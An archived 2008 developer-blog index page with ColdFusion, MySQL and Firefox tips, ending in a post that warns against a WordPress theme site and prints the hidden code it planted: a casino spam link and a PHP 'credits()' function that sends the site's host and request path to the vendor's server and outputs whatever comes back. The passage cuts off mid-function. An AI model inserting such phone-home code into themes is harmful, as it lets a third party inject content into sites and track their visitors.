
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>chapter31 &raquo;</title>
	<meta name="author" content="Michael Sharman">

	
	<meta name="description" content="If I were a betting man I&#8217;d bet a LOT of money (and perhaps even the house!) that you&#8217;ve done this before. Try to spot the error in the &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="chapter31 &raquo;" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>

<body>
	<header id="header" class="inner"><h1><a href="/">chapter31 &raquo;</a></h1>
<nav id="main-nav"><ul class="main-navigation">
  <li><a href="/about">about</a></li>
  <li><a href="https://github.com/michaelsharman/">projects</a></li>
  <li><a href="/shell-commands">shell</a></li>
  <li><a href="http://tools.chapter31.com/">tools</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main-navigation">
  <li><a href="/about">about</a></li>
  <li><a href="https://github.com/michaelsharman/">projects</a></li>
  <li><a href="/shell-commands">shell</a></li>
  <li><a href="http://tools.chapter31.com/">tools</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="http://google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:chapter31.com">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/michaelsharman" title="Twitter">Twitter</a>
		
		
		<a class="github" href="https://github.com/michaelsharman" title="GitHub">GitHub</a>
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
	</div>
	<form class="search" action="http://google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:chapter31.com">
	</form>
</nav>

</header>
	
		

	
	<div id="content" class="inner">


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/02/26/code-tip-how-to-structure-your-queryparams/">
		
			Code Tip: How to Structure Your Queryparams</a>
	</h2>
	<div class="entry-content">
		<p>If I were a betting man I&#8217;d bet a LOT of money (and perhaps even the house!) that you&#8217;ve done this before.</p>

<p>Try to spot the error in the query below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">cfquery</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;qCreate&quot;</span> <span class="nx">datasource</span><span class="o">=</span><span class="s2">&quot;#getDSN()#&quot;</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nx">myTable</span>
</span><span class='line'>      <span class="p">(</span>
</span><span class='line'>          <span class="nx">ObjectId</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">Country</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">DateOfBirth</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">Email</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">FirstName</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">Gender</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">LastName</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">MainSchoolId</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">PhoneHome</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">PhoneMobile</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">PostCode</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">State</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">Street</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">StudentId</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">StudentPassword</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">StudentPodId</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">Suburb</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>  <span class="nx">VALUES</span>
</span><span class='line'>      <span class="p">(</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#createUUID()#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;country&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_date&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#createODBCDate(arguments.oUser.get(&#39;dateOfBirth&#39;))#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;email&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;firstName&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;gender&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;lastName&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_integer&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;mainSchoolId&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;phoneHome&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;phoneMobile&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;postCode&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;state&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;street&#39;)#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_integer&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.getStudentId()#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#hash(arguments.oUser.get(&#39;studentPassword&#39;))#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#createUUID()#&quot;</span> <span class="o">/&gt;</span><span class="p">,</span>
</span><span class='line'>          <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;suburb&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'>      <span class="p">)</span>            
</span><span class='line'><span class="o">&lt;</span><span class="err">/cfquery&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Spot it? It&#8217;s one of those &#8220;Where&#8217;s Wally&#8221; errors where some people spot it straight away and some people (like me today) spend FAR too long searching for what went wrong.</p>

<p>Ok&#8230;if you haven&#8217;t spotted it there is a missing comma in the SQL (after the 7th argument &#8216;lastName&#8217;).</p>

<p>Even though in hindsight the error returned from MySQL was telling me exactly what was wrong:</p>

<blockquote><p>&#8220;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#8216;MainSchoolId = 8459, PhoneHome = &#8221;, PhoneMobile = &#8221;, Post&#8217; at line 9&#8221;</p></blockquote>

<p>Still took me longer than 5 minutes to debug. So&#8230;</p>

<p>A new rule for me is going back to what I used to do all the time for this exact reason (no idea why I didn&#8217;t in this case).</p>

<p>Putting the comma at the START of any argument like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#createUUID()#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;country&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_date&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#createODBCDate(arguments.oUser.get(&#39;dateOfBirth&#39;))#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;email&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;firstName&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;gender&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;lastName&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_integer&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;mainSchoolId&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;phoneHome&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;phoneMobile&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;postCode&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;state&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;street&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_integer&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.getStudentId()#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#hash(arguments.oUser.get(&#39;studentPassword&#39;))#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#createUUID()#&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="p">,</span> <span class="o">&lt;</span><span class="nx">cfqueryparam</span> <span class="nx">cfsqltype</span><span class="o">=</span><span class="s2">&quot;cf_sql_varchar&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;#arguments.oUser.get(&#39;suburb&#39;)#&quot;</span> <span class="o">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now it&#8217;s EASY to spot this all too common syntax error, especially if you&#8217;re copying and pasting from somewhere else :)</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-02-26T15:16:49+11:00" pubdate data-updated="true">Feb 26<span>th</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>


</div>
	
		<div class="comments"><a href="/2008/02/26/code-tip-how-to-structure-your-queryparams//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/02/22/cfdocs-on-air-livedocs-for-cf8/">
		
			Cfdocs on Air (Livedocs for CF8)</a>
	</h2>
	<div class="entry-content">
		<p><a href="http://brianflove.com/">Brian Love</a> recently <a href="http://blog.brianflove.com/articles/2008/02/19/cfdocs-on-air">released an AIR application</a> he wrote which wraps up the <a href="http://livedocs.adobe.com/coldfusion/8/htmldocs/index.html">ColdFusion 8 &#8216;livedocs&#8217;</a>.</p>

<p>This is a great idea and a fantastic tool to add to your list. I&#8217;m sure most developers use livedocs as a reference (I do all the time) but historically the are SO slow (not to mention that I think Adobe needs to invest in a little SEO as I often get CF6 livedocs at the top of Google results!).</p>

<p>The CF8 online docs were given a much needed face lift but still are a little slow and the initial page always reloads into a frameset.</p>

<p>While we do have tools like <a href="http://www.cfquickdocs.com/">cfquickdocs</a> which are great, having everything as a local resource on your file system makes life a lot easier :)</p>

<p>Now I just need to wait until Adobe releases AIR for Linux so I can use this at work :(</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-02-22T09:33:59+11:00" pubdate data-updated="true">Feb 22<span>nd</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/air/'>AIR</a>, <a class='category' href='/categories/coldfusion/'>ColdFusion</a>


</div>
	
		<div class="comments"><a href="/2008/02/22/cfdocs-on-air-livedocs-for-cf8//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/02/21/using-mysql-administrator-to-view-real-time-stats/">
		
			Using MySQL Administrator to View Real Time Stats</a>
	</h2>
	<div class="entry-content">
		<p>I was working on piece of code today which was sending an Ajax request to the server. The result of this request could have been 0 - 5 database UPDATE statements.</p>

<p>What I needed was a way to test my code to make sure the correct number of database statements were being executed based on the user event which fired the request.</p>

<p>There are of course a number of ways I could have done this including:</p>

<ul>
<li>Returning a &#8216;count&#8217; or equivalent from the server to my Ajax callback</li>
<li>Manually checking the relevant records in the database via a query</li>
<li>Logging the results etc</li>
</ul>


<p>While all of these are fine, they all involved a bit more effort so I wanted to find another way to simply see how many UPDATES where being run.</p>

<p>Enter <a href="http://www.mysql.com/products/tools/administrator/">MySQL Administrator</a> :)</p>

<p>There are a BUNCH of useful operations you can perform using this free tool as well as viewing real time performance stats including the current server health (such as memory usage and current traffic) and the number of cached queries vs actual queries which are being accessed.</p>

<p>The one I was interested in resides in the &#8216;Health&#8217; area and allows you to view a real time count of all DDL and DML statements which hit the server. Perfect!</p>

<p><a href="/images/uploads/2008/02/mysql_admin.jpg"><img src="/images/uploads/2008/02/mysql_admin.thumbnail.jpg" alt="mysql administrator" /></a></p>

<p>All I needed to do was run my page, fire the Ajax event and then &#8216;refresh&#8217; the Health view in MySQL Admin.</p>

<p>For those that use MySQL and don&#8217;t really know this tool, take the time&#8230;it&#8217;s well worth it!</p>

<p>I&#8217;m sure MSSQL has similar tools like the Profiler etc, but I&#8217;m really not using it these days.</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-02-21T17:49:15+11:00" pubdate data-updated="true">Feb 21<span>st</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/databases/'>Databases</a>


</div>
	
		<div class="comments"><a href="/2008/02/21/using-mysql-administrator-to-view-real-time-stats//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/02/19/a-couple-more-cool-firefox-tips/">
		
			A Couple More Cool Firefox Tips</a>
	</h2>
	<div class="entry-content">
		<p>Another couple of cool Firefox features which most people probably already know about.</p>

<p>How many times have you closed a tab only to realise &#8221;<em>Damn&#8230;I still wanted that open!</em>&#8221;? Well I do that about everyday and although you have the general history manager&#8230;if you&#8217;ve visited 100 sites that day it&#8217;s a pain to wade through to find the tab you just closed.</p>

<p>Instead you can visit the History menu and see the item &#8220;Recently Closed Tabs&#8221; for a list of the last 10 viewed tabs. From memory there is also an addon which allows you to &#8220;undo&#8221; a close operation on a tab, but this menu option is cool!</p>

<p>Another thing is making sure you get alerted whenever there is a JavaScript error, I think this is quite important as a developer and although you do have the &#8220;console&#8221; it&#8217;s nice to have an &#8220;in your face&#8221; reminder that there is an error on your page.</p>

<p>To turn this on using the invaluable <a href="http://chrispederick.com/work/web-developer/">Web Developer Toolbar</a> addon, click Tools -> Web Developer -> Options -> Options and under &#8220;Miscellaneous&#8221; you can choose up to 3 options for opening the console (you can also get to this from Options -> Options on the actual Web Developer Toolbar):</p>

<ul>
<li>When there is a CSS error</li>
<li>When there is a JavaScript warning</li>
<li>When there is a JavaScript error</li>
</ul>


<p>It&#8217;s this last option that I turn on during development to get an error popup. Note that it is sometimes best to turn this off when surfing the web as there are SO many sites which have little JavaScript errors, causing popup hell :(</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-02-19T07:50:05+11:00" pubdate data-updated="true">Feb 19<span>th</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/misc/'>Misc</a>


</div>
	
		<div class="comments"><a href="/2008/02/19/a-couple-more-cool-firefox-tips//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/02/07/the-only-valid-measurement-of-code-quality/">
		
			The Only Valid Measurement of Code Quality</a>
	</h2>
	<div class="entry-content">
		<p>A friend of mine <a href="http://www.daemon.com.au/">Don</a> sent me this yesterday:</p>

<p><img src="/images/uploads/2008/02/wtfm.jpg" alt="WTF Code Quality" /></p>

<p>Gold!</p>

<p>:)</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-02-07T11:05:17+11:00" pubdate data-updated="true">Feb 7<span>th</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/misc/'>Misc</a>


</div>
	
		<div class="comments"><a href="/2008/02/07/the-only-valid-measurement-of-code-quality//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes/">
		
			Don&#8217;t Ever User www.templatesbrowser.com for Wordpress Themes</a>
	</h2>
	<div class="entry-content">
		<p>Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">nosc</span><span class="o">/</span><span class="nx">ript</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">hreflang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://www.portalux.com/&quot;</span><span class="o">&gt;</span><span class="nx">online</span> <span class="nx">casino</span><span class="o">&lt;</span><span class="err">/a&gt;&lt;/nosc/ript&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>My investigations found that where I downloaded the template from was a nice (NOT) little site called <a href="http://www.templatesbrowser.com/wordpress-themes/">http://www.templatesbrowser.com/</a>. Now what they do is add a &#8220;functions.php&#8221; file in the original code base, then call a method from the footer &#8220;credits();&#8221; which is in the functions.php file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">credits</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="nx">$url</span> <span class="o">=</span> <span class="s2">&quot;http://get.templatesbrowser.com/wp.php?&quot;</span> <span class="p">.</span>
</span><span class='line'>       <span class="s2">&quot;url=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="p">.</span> <span class="s2">&quot;&amp;&quot;</span> <span class="p">.</span> <span class="s2">&quot;host=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]);</span>
</span><span class='line'> <span class="nx">$check</span> <span class="o">=</span> <span class="err">@</span><span class="nx">fsockopen</span><span class="p">(</span><span class="s2">&quot;get.templatesbrowser.com&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">$errno</span><span class="p">,</span> <span class="nx">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="nx">$check</span><span class="p">)</span>
</span><span class='line'> <span class="p">{</span>
</span><span class='line'>  <span class="err">@</span><span class="nx">readfile</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">fclose</span><span class="p">(</span><span class="nx">$check</span><span class="p">);</span>
</span><span class='line'> <span class="p">}</span>
